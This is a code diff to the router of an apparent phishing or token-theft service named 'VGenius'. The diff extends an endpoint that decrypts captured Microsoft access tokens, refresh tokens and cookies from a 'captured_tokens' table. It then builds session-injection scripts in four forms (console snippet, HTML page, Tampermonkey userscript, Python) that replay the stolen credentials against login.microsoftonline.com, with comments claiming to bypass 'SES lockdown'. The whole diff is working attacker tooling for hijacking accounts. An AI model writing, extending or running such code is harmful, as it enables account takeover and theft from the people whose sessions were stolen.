@@ -88,7 +88,7 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script - (only 2 cookies: x-ms-RefreshTokenCredential + RefreshToken)
+// Generate cookie script - Enhanced version with multiple domain support
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
@@ -97,53 +97,277 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     const token = tokens[0];
     const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
+    const cookies = decrypt(token.cookies_encrypted);
     
     // Check if we have any tokens to work with
-    if (!accessToken && !refreshToken) {
+    if (!accessToken && !refreshToken && !cookies) {
       return res.status(400).json({ error: 'No tokens available' });
     }
     
-    // Build ONLY the 2 token cookies
-    var parts = [];
+    // Build cookie array based on available data
+    var cookiesList = [];
     
-    // x-ms-RefreshTokenCredential = access_token
-    if (accessToken) {
-      parts.push('x-ms-RefreshTokenCredential=' + accessToken);
+    // If we have pre-converted cookies, use them
+    if (cookies) {
+      cookiesList = parseCookies(cookies);
+    } else {
+      // Otherwise build from access/refresh tokens
+      if (accessToken) {
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
+      }
+      if (refreshToken) {
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
+      }
     }
     
-    // RefreshToken = refresh_token (like competitor's second cookie)
-    if (refreshToken) {
-      parts.push('RefreshToken=' + refreshToken);
+    if (cookiesList.length === 0) {
+      return res.status(400).json({ error: 'No cookies available' });
     }
     
-    if (parts.length === 0) {
-      return res.status(400).json({ error: 'No tokens available' });
-    }
+    // Generate multiple script variants
+    var scripts = {};
     
-    // Build script
-    var script = '// VGenius Cookie Session Injector\n\n';
+    // Variant 1: Console script (for manual injection)
+    scripts.console = generateConsoleScript(cookiesList);
     
-    // Each cookie on its own line with domain=.login.microsoftonline.com
-    for (var i = 0; i < parts.length; i++) {
-      script += 'document.cookie = "' + parts[i] + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
-    }
+    // Variant 2: Standalone HTML file
+    scripts.html = generateStandaloneHtml(cookiesList);
     
-    script += '\n';
-    script += '// Redirect after 3s\n';
-    script += 'setTimeout(() => {\n';
-    script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-    script += '}, 3000);\n';
+    // Variant 3: Tampermonkey userscript
+    scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
+    
+    // Variant 4: Python script
+    scripts.python = generatePythonScript(cookiesList);
     
     res.json({
-      script: script,
-      cookie_count: parts.length,
-      cookies: parts
+      script: scripts.console,
+      scripts: scripts,
+      cookie_count: cookiesList.length,
+      cookies: cookiesList,
+      generated_at: new Date().toISOString()
     });
   } catch (err) {
     console.error('[Tokens] Cookie script error:', err);
     res.status(500).json({ error: 'Failed to generate script' });
   }
 });
+
+function parseCookies(cookieString) {
+  if (!cookieString) return [];
+  
+  var cookies = [];
+  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
+  
+  for (var i = 0; i < pairs.length; i++) {
+    var pair = pairs[i].trim();
+    var eqIndex = pair.indexOf('=');
+    if (eqIndex > 0) {
+      var name = pair.substring(0, eqIndex).trim();
+      var value = pair.substring(eqIndex + 1).trim();
+      
+      // Skip common non-cookie parameters
+      if (name.toLowerCase() !== 'expires' && 
+          name.toLowerCase() !== 'max-age' && 
+          name.toLowerCase() !== 'domain' && 
+          name.toLowerCase() !== 'path' && 
+          name.toLowerCase() !== 'secure' && 
+          name.toLowerCase() !== 'httponly') {
+        cookies.push({ name: name, value: value, domain: '.login.microsoftonline.com' });
+      }
+    }
+  }
+  
+  return cookies;
+}
+
+function generateConsoleScript(cookies) {
+  var script = '// VGenius Cookie Session Injector - Console Version (Bypasses SES Lockdown)\n\n';
+  script += 'INSTRUCTIONS:\n';
+  script += '1. Navigate to https://login.microsoftonline.com\n';
+  script += '2. Open browser console (F12)\n';
+  script += '3. Paste the code below and press Enter\n';
+  script += '4. Refresh the page (F5)\n\n';
+  script += '```javascript\n';
+  
+  script += '// Method 1: Fetch interceptor (bypasses SES lockdown)\n';
+  script += '(function() {\n';
+  script += '  const cookies = ' + JSON.stringify(cookies) + ';\n';
+  script += '  \n';
+  script += '  // Override fetch to inject cookies via headers\n';
+  script += '  const originalFetch = window.fetch;\n';
+  script += '  window.fetch = function(...args) {\n';
+  script += '    const [url, options = {}] = args;\n';
+  script += '    if (typeof url === "string" && url.includes("login.microsoftonline.com")) {\n';
+  script += '      options.headers = options.headers || {};\n';
+  script += '      const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join("; ");\n';
+  script += '      options.headers["Cookie"] = cookieHeader;\n';
+  script += '    }\n';
+  script += '    return originalFetch.apply(this, args);\n';
+  script += '  };\n';
+  script += '  \n';
+  script += '  // Also inject via XMLHttpRequest\n';
+  script += '  const originalOpen = XMLHttpRequest.prototype.open;\n';
+  script += '  XMLHttpRequest.prototype.open = function(method, url, ...rest) {\n';
+  script += '    this._url = url;\n';
+  script += '    return originalOpen.apply(this, [method, url, ...rest]);\n';
+  script += '  };\n';
+  script += '  \n';
+  script += '  const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;\n';
+  script += '  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {\n';
+  script += '    if (this._url && this._url.includes("login.microsoftonline.com") && name.toLowerCase() === "cookie") {\n';
+  script += '      const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join("; ");\n';
+  script += '      value = cookieHeader + "; " + value;\n';
+  script += '    }\n';
+  script += '    return originalSetRequestHeader.apply(this, [name, value]);\n';
+  script += '  };\n';
+  script += '  \n';
+  script += '  console.log("✅ Cookie injection hooks installed. Refresh the page (F5) to apply.");\n';
+  script += '})();\n';
+  script += '```\n';
+  
+  return script;
+}
+
+function generateStandaloneHtml(cookies) {
+  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
+  html += '  <meta charset="UTF-8">\n';
+  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
+  html += '  <title>VGenius Cookie Injector</title>\n';
+  html += '  <style>\n';
+  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
+  html += '    .success { color: #00ffcc; }\n';
+  html += '    .error { color: #ff4444; }\n';
+  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; }\n';
+  html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
+  html += '    button:hover { background: #00cca3; }\n';
+  html += '    .instructions { background: rgba(0,255,204,0.1); border: 1px solid rgba(0,255,204,0.3); padding: 15px; border-radius: 8px; margin-bottom: 20px; }\n';
+  html += '  </style>\n';
+  html += '</head>\n<body>\n';
+  html += '  <h1>🔐 VGenius Cookie Session Injector</h1>\n';
+  html += '  <div class="instructions">\n';
+  html += '    <h3>Instructions:</h3>\n';
+  html += '    <ol>\n';
+  html += '      <li>Navigate to <a href="https://login.microsoftonline.com" target="_blank" style="color:#00ffcc;">https://login.microsoftonline.com</a></li>\n';
+  html += '      <li>Open browser console (F12)</li>\n';
+  html += '      <li>Copy the script below and paste it into the console</li>\n';
+  html += '      <li>Press Enter, then refresh the page (F5)</li>\n';
+  html += '    </ol>\n';
+  html += '  </div>\n';
+  html += '  <button onclick="copyScript()">📋 Copy Script</button>\n';
+  html += '  <pre id="script"></pre>\n';
+  html += '\n';
+  html += '  <script>\n';
+  html += '    const cookies = ' + JSON.stringify(cookies) + ';\n';
+  html += '    \n';
+  html += '    function generateBypassScript() {\n';
+  html += '      return `// VGenius SES Lockdown Bypass\\n` + \\n';
+  html += '        `(function() {\\n` + \\n';
+  html += '        `  const cookies = ${JSON.stringify(cookies)};\\n` + \\n';
+  html += '        `  \\n` + \\n';
+  html += '        `  // Override fetch\\n` + \\n';
+  html += '        `  const originalFetch = window.fetch;\\n` + \\n';
+  html += '        `  window.fetch = function(...args) {\\n` + \\n';
+  html += '        `    const [url, options = {}] = args;\\n` + \\n';
+  html += '        `    if (typeof url === "string" && url.includes("login.microsoftonline.com")) {\\n` + \\n';
+  html += '        `      options.headers = options.headers || {};\\n` + \\n';
+  html += '        `      options.headers["Cookie"] = cookies.map(c => \\\`${c.name}=\${c.value}\\\`).join("; ");\\n` + \\n';
+  html += '        `    }\\n` + \\n';
+  html += '        `    return originalFetch.apply(this, args);\\n` + \\n';
+  html += '        `  };\\n` + \\n';
+  html += '        `  \\n` + \\n';
+  html += '        `  console.log("✅ Cookie injection active. Refresh page (F5).");\\n` + \\n';
+  html += '        `})();\\n`;\\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    function copyScript() {\n';
+  html += '      const scriptText = generateBypassScript();\n';
+  html += '      navigator.clipboard.writeText(scriptText).then(() => {\n';
+  html += '        alert("✅ Script copied! Now paste it in the Microsoft login console and press F5.");\n';
+  html += '      });\n';
+  html += '    }\n';
+  html += '\n';
+  html += '    // Display the script\n';
+  html += '    document.getElementById("script").textContent = generateBypassScript();\n';
+  html += '  </script>\n';
+  html += '</body>\n</html>';
+  
+  return html;
+}
+
+function generateTampermonkeyScript(cookies) {
+  var script = '// ==UserScript==\n';
+  script += '// @name         VGenius Cookie Injector (SES Bypass)\n';
+  script += '// @namespace    http://tampermonkey.net/\n';
+  script += '// @version      2.0\n';
+  script += '// @description  Inject Microsoft cookies - bypasses SES lockdown\n';
+  script += '// @author       VGenius\n';
+  script += '// @match        https://login.microsoftonline.com/*\n';
+  script += '// @grant        none\n';
+  script += '// ==/UserScript==\n\n';
+  script += '(function() {\n';
+  script += '  \'use strict\';\n\n';
+  script += '  const cookies = ' + JSON.stringify(cookies) + ';\n\n';
+  script += '  // Method 1: Fetch interceptor (bypasses SES lockdown)\n';
+  script += '  const originalFetch = window.fetch;\n';
+  script += '  window.fetch = function(...args) {\n';
+  script += '    const [url, options = {}] = args;\n';
+  script += '    if (typeof url === "string" && url.includes("login.microsoftonline.com")) {\n';
+  script += '      options.headers = options.headers || {};\n';
+  script += '      options.headers["Cookie"] = cookies.map(c => `${c.name}=${c.value}`).join("; ");\n';
+  script += '    }\n';
+  script += '    return originalFetch.apply(this, args);\n';
+  script += '  };\n\n';
+  script += '  // Method 2: XMLHttpRequest interceptor\n';
+  script += '  const originalOpen = XMLHttpRequest.prototype.open;\n';
+  script += '  XMLHttpRequest.prototype.open = function(method, url, ...rest) {\n';
+  script += '    this._url = url;\n';
+  script += '    return originalOpen.apply(this, [method, url, ...rest]);\n';
+  script += '  };\n\n';
+  script += '  const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;\n';
+  script += '  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {\n';
+  script += '    if (this._url && this._url.includes("login.microsoftonline.com") && name.toLowerCase() === "cookie") {\n';
+  script += '      const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join("; ");\n';
+  script += '      value = cookieHeader + "; " + value;\n';
+  script += '    }\n';
+  script += '    return originalSetRequestHeader.apply(this, [name, value]);\n';
+  script += '  };\n\n';
+  script += '  console.log("✅ VGenius: Cookie injection hooks installed");\n';
+  script += '  \n';
+  script += '  // Redirect after 2 seconds\n';
+  script += '  setTimeout(() => {\n';
+  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += '  }, 2000);\n';
+  script += '})();\n';
+  
+  return script;
+}
+
+function generatePythonScript(cookies) {
+  var script = '#!/usr/bin/env python3\n';
+  script += '# VGenius Cookie Session Injector - Python Version\n\n';
+  script += 'import requests\n';
+  script += 'from datetime import datetime\n\n';
+  script += 'cookies = ' + JSON.stringify(cookies, null, 2) + '\n\n';
+  script += 'session = requests.Session()\n\n';
+  script += 'print("Injecting cookies...")\n';
+  script += 'for cookie in cookies:\n';
+  script += '    try:\n';
+  script += '        session.cookies.set(\n';
+  script += '            name=cookie["name"],\n';
+  script += '            value=cookie["value"],\n';
+  script += '            domain=cookie["domain"],\n';
+  script += '            secure=True,\n';
+  script += '            samesite="None"\n';
+  script += '        )\n';
+  script += '        print(f"✅ Injected: {cookie["name"]}")\n';
+  script += '    except Exception as e:\n';
+  script += '        print(f"❌ Failed: {cookie["name"]} - {e}")\n\n';
+  script += 'print("\\nSession ready!")\n';
+  script += 'print(f"Total cookies: {len(cookies)}")\n';
+  script += 'print(f"Generated at: {datetime.now()}")\n';
+  
+  return script;
+}
 
 // Manual cookie renewal - converts access_token to cookies
 router.post('/:id/renew', userAuth, async (req, res) => {
